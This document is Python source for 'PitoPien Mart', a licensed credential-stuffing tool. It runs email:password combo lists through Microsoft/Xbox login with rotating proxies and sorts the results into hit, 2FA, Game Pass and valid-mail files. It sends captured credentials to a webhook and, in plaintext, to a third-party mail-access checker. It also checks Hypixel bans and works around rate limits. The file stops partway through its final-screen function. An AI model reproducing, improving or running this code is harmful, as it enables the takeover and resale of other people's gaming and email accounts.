import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
import hashlib
import base64
import platform
from datetime import datetime, timezone, timedelta
from colorama import Fore, Style # Import Style for resetting colors
from console import utils
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
from io import StringIO

#banchecking
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.connection import Connection
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

# --- LICENSE SYSTEM START ---
SECRET_KEY = "sk_9V$uR7^mTp!P2z@dXf#L3qY1ZwG&Kc8oJbE4Nh%SaRtUeMi" # This must match the generator
LICENSE_FILE = "license.key"

def get_device_id():
    """Generates a unique and consistent device ID."""
    # Combine multiple sources for a more robust ID
    id_string = str(uuid.getnode()) + platform.processor() + platform.system() + platform.node()
    hashed_id = hashlib.sha256(id_string.encode('utf-8')).hexdigest()
    return hashed_id

def decrypt_license(encrypted_key, key):
    """Decrypts the license key using the shared secret key."""
    try:
        encrypted_data = base64.urlsafe_b64decode(encrypted_key.encode('utf-8'))
        decrypted_data = bytearray()
        key_bytes = key.encode('utf-8')
        for i in range(len(encrypted_data)):
            decrypted_data.append(encrypted_data[i] ^ key_bytes[i % len(key_bytes)])
        return decrypted_data.decode('utf-8')
    except Exception:
        return None

def check_license():
    """Checks for a valid license file and validates it."""
    device_id = get_device_id()

    if not os.path.exists(LICENSE_FILE):
        os.system('cls')
        print(Fore.YELLOW + "="*50)
        print("          LICENSE NOT FOUND!          ")
        print("="*50)
        print(f"\nYour Device ID is: {device_id}\n")
        print("Please provide this ID to your administrator to get a license key.")
        print("="*50 + Style.RESET_ALL)
        license_key = input("\nEnter your license key: ").strip()
        with open(LICENSE_FILE, 'w') as f:
            f.write(license_key)
    
    with open(LICENSE_FILE, 'r') as f:
        license_key = f.read().strip()

    if not license_key:
        print(Fore.RED + "License key file is empty. Please provide a valid key. Exiting." + Style.RESET_ALL)
        sys.exit()

    decrypted_content = decrypt_license(license_key, SECRET_KEY)

    if decrypted_content is None:
        print(Fore.RED + "Invalid or corrupt license key. Deleting key file." + Style.RESET_ALL)
        print(Fore.RED + "Please restart and enter a valid key." + Style.RESET_ALL)
        os.remove(LICENSE_FILE)
        sys.exit()

    try:
        stored_device_id, expiry_date_str = decrypted_content.split('|')
        expiry_date = datetime.fromisoformat(expiry_date_str)
    except ValueError:
        print(Fore.RED + "License key format is incorrect. Deleting key file." + Style.RESET_ALL)
        print(Fore.RED + "Please restart and enter a valid key." + Style.RESET_ALL)
        os.remove(LICENSE_FILE)
        sys.exit()

    if stored_device_id != device_id:
        print(Fore.RED + "License key is for a different device. Exiting." + Style.RESET_ALL)
        print(f"Your Device ID: {device_id}")
        print(f"License is for: {stored_device_id}")
        sys.exit()

    if datetime.now() > expiry_date:
        print(Fore.RED + f"Your license has expired on {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}. Exiting." + Style.RESET_ALL)
        sys.exit()

    print(Fore.GREEN + f"\nLicense validated successfully. Expires on: {expiry_date.strftime('%Y-%m-%d')}" + Style.RESET_ALL)
    time.sleep(2) # Give user time to see the message
    return True
# --- LICENSE SYSTEM END ---


# PITOPIEN ASCII Logo (Purple)
logo = Fore.MAGENTA + '''
 ██████╗ ██╗████████╗ ██████╗  ██████╗ ██╗██████╗ ██╗███████╗███╗   ██╗
 ██╔══██╗██║╚══██╔══╝██╔═══██╗██╔═══██╗██║██╔══██╗██║██╔════╝████╗  ██║
 ██████╔╝██║   ██║   ██║   ██║██║   ██║██║██████╔╝██║█████╗  ██╔██╗ ██║
 ██╔═══╝ ██║   ██║   ██║   ██║██║   ██║██║██╔═══╝ ██║██╔══╝  ██║╚██╗██║
 ██║     ██║   ██║   ╚██████╔╝╚██████╔╝██║██║     ██║███████╗██║ ╚████║
 ╚═╝     ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝
''' + Style.RESET_ALL # Reset color after logo

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = [] # Storing ban proxies as raw strings, will be parsed at use
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
#sys.stderr = open(os.devnull, 'w') #bancheck prints errors in cmd

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "PitoPien Mart"
            }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if proxytype not in ["'4'", "'5'"] and len(proxylist) < 5: time.sleep(20) # Only sleep if not proxyless and few proxies
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1
    
    def ban(self):
        global errors
        if config.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                try:
                    if len(banproxies) > 0:
                        proxy_str = random.choice(banproxies)
                        # Parse ban proxy string
                        parts = proxy_str.split(':')
                        if len(parts) == 2:  # ip:port
                            socks.set_default_proxy(socks.SOCKS5, addr=parts[0], port=int(parts[1]))
                        elif len(parts) == 4:  # ip:port:user:pass or user:pass:ip:port
                            # Determine format based on typical IP structure
                            if '.' in parts[0] or '[' in parts[0]: # Likely ip:port:user:pass
                                socks.set_default_proxy(socks.SOCKS5, addr=parts[0], port=int(parts[1]), username=parts[2], password=parts[3])
                            else: # Likely user:pass:ip:port
                                socks.set_default_proxy(socks.SOCKS5, addr=parts[2], port=int(parts[3]), username=parts[0], password=parts[1])
                        socket.socket = socks.socksocket
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned == None or c < 1000:
                            time.sleep(.01)
                            c+=1
                        connection.disconnect()
                    except: pass
                    sys.stderr = original_stderr
                except: pass
                if self.banned != None: break
                tries+=1

    def handle(self):
        global hits
        hits+=1
        if screen == "'2'": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        if self.name != 'N/A':
            try: Capture.hypixel(self)
            except: pass
            try: Capture.optifine(self)
            except: pass
            try: Capture.full_access(self)
            except: pass
            try: Capture.namechange(self)
            except: pass
            try: Capture.ban(self)
            except: pass
        open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
        Capture.notify(self)
class Login:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    global retries
    while True: #will retry forever until it gets a working request/url.
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxies = getproxy() # Ensure proxies are set for the session
        retries+=1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy()
                retries+=1
                tries+=1
                if proxytype not in ["'4'", "'5'"] and len(proxylist) < 5: time.sleep(20) # Only sleep if not proxyless and few proxies
        except:
            session.proxies = getproxy()
            retries+=1
            tries+=1
            if proxytype not in ["'4'", "'5'"] and len(proxylist) < 5: time.sleep(20) # Only sleep if not proxyless and few proxies
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy()
                if proxytype not in ["'4'", "'5'"] and len(proxylist) < 5: time.sleep(20) # Only sleep if not proxyless and few proxies
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy()
            continue

def checkmc(session, email, password, token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    while True:
        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                    CAPTURE.handle()
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy()
            if proxytype not in ["'4'", "'5'"] and len(proxylist) < 1: time.sleep(20) # Only sleep if not proxyless and few proxies
            continue
        else:
            return False

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                if proxytype not in ["'4'", "'5'"] and len(proxylist) < 1: time.sleep(20) # Only sleep if not proxyless and few proxies
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy()
            continue

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load():
    global Combos, fname
    os.system('cls') # Clear screen for better GUI
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "          File Selection - PitoPien Mart         ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"[ERROR] Invalid File. Please select a valid .txt file.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed." + Style.RESET_ALL)
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded." + Style.RESET_ALL)
        except Exception as ex:
            print(Fore.LIGHTRED_EX+f"[ERROR] Your file is probably harmed or an error occurred: {ex}. Please check the file format." + Style.RESET_ALL)
            time.sleep(2)
            Load()
    print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)
    time.sleep(1) # Give user time to read

def Proxys():
    global proxylist
    os.system('cls') # Clear screen for better GUI
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "            Proxy Selection - PitoPien Mart        ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"[ERROR] Invalid File. Please select a valid .txt file." + Style.RESET_ALL)
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    line = line.strip()
                    if not line:
                        continue
                    
                    proxy_entry = {}
                    
                    if '@' in line: # Potentially user:pass@host:port format
                        try:
                            # Prepend a dummy scheme for urlparse to function correctly
                            # It expects a scheme like http:// or socks5://.
                            # Using http:// as a placeholder; the actual proxy type (HTTP/SOCKS)
                            # is determined later by the 'proxytype' variable in 'getproxy'.
                            parsed = urlparse(f"http://{line}") 
                            
                            proxy_entry['host'] = parsed.hostname
                            proxy_entry['port'] = parsed.port
                            if parsed.username:
                                proxy_entry['user'] = parsed.username
                            if parsed.password:
                                proxy_entry['pass'] = parsed.password
                            
                            if not proxy_entry['host'] or not proxy_entry['port']:
                                raise ValueError("Missing host or port after parsing")

                        except Exception as parse_ex:
                            print(Fore.YELLOW + f"Skipping malformed proxy line (URL parse error): {line} - {parse_ex}" + Style.RESET_ALL)
                            continue
                    else: # Old formats: ip:port or ip:port:user:pass or user:pass:ip:port
                        parts = line.split(':')
                        if len(parts) == 2: # ip:port
                            proxy_entry['host'] = parts[0]
                            proxy_entry['port'] = int(parts[1])
                        elif len(parts) == 4: # ip:port:user:pass or user:pass:ip:port
                            # Heuristic to guess format: check if first part looks like an IP
                            if '.' in parts[0] or '[' in parts[0]: # Assumed ip:port:user:pass
                                proxy_entry['host'] = parts[0]
                                proxy_entry['port'] = int(parts[1])
                                proxy_entry['user'] = parts[2]
                                proxy_entry['pass'] = parts[3]
                            else: # Assumed user:pass:ip:port
                                proxy_entry['user'] = parts[0]
                                proxy_entry['pass'] = parts[1]
                                proxy_entry['host'] = parts[2]
                                proxy_entry['port'] = int(parts[3])
                        else:
                            print(Fore.YELLOW + f"Skipping malformed proxy line (incorrect parts count): {line}" + Style.RESET_ALL)
                            continue
                    
                    proxylist.append(proxy_entry)

            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines." + Style.RESET_ALL)
            time.sleep(2)
        except Exception as ex:
            print(Fore.LIGHTRED_EX+f"[ERROR] Your file is probably harmed or an error occurred: {ex}" + Style.RESET_ALL)
            time.sleep(2)
            Proxys()
    print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)
    time.sleep(1) # Give user time to read

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"PitoPien Mart by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "         PitoPien Mart - Checking Progress       ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    print(f" {Fore.WHITE}[{checked}/{len(Combos)}] Checked" + Style.RESET_ALL)
    print(f" {Fore.GREEN}[{hits}] Hits" + Style.RESET_ALL)
    print(f" {Fore.RED}[{bad}] Bad" + Style.RESET_ALL)
    print(f" {Fore.BLUE}[{sfa}] SFA" + Style.RESET_ALL)
    print(f" {Fore.CYAN}[{mfa}] MFA" + Style.RESET_ALL)
    print(f" {Fore.MAGENTA}[{twofa}] 2FA" + Style.RESET_ALL)
    print(f" {Fore.LIGHTGREEN_EX}[{xgp}] Xbox Game Pass" + Style.RESET_ALL)
    print(f" {Fore.LIGHTBLUE_EX}[{xgpu}] Xbox Game Pass Ultimate" + Style.RESET_ALL)
    print(f" {Fore.YELLOW}[{other}] Other" + Style.RESET_ALL)
    print(f" {Fore.LIGHTMAGENTA_EX}[{vm}] Valid Mail" + Style.RESET_ALL)
    print(f" {Fore.WHITE}[{retries}] Retries" + Style.RESET_ALL)
    print(f" {Fore.RED}[{errors}] Errors" + Style.RESET_ALL)
    print(f" {Fore.YELLOW}[{cmp1*60}] CPM" + Style.RESET_ALL)
    print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)

    utils.set_title(f"PitoPien Mart by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.CYAN + "      PitoPien Mart - Checking Complete!       ")
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    print(Fore.LIGHTGREEN_EX+"\nChecking Finished!" + Style.RESET_ALL)
    print(f"\n{Fore.GREEN}Hits: {hits}" + Style.RESET_ALL)
    print(f"{Fore.RED}Bad: {bad}" + Style.RESET_ALL)
    print(f"{Fore.BLUE}SFA: {sfa}" + Style.RESET_ALL)
    print(f"{Fore.CYAN}MFA: {mfa}" + Style.RESET_ALL)
    print(f"{Fore.MAGENTA}2FA: {twofa}" + Style.RESET_ALL)
    print(f"{Fore.LIGHTGREEN_EX}Xbox Game Pass: {xgp}" + Style.RESET_ALL)
    print(f"{Fore.LIGHTBLUE_EX}Xbox Game Pass Ultimate: {xgpu}" + Style.RESET_ALL)
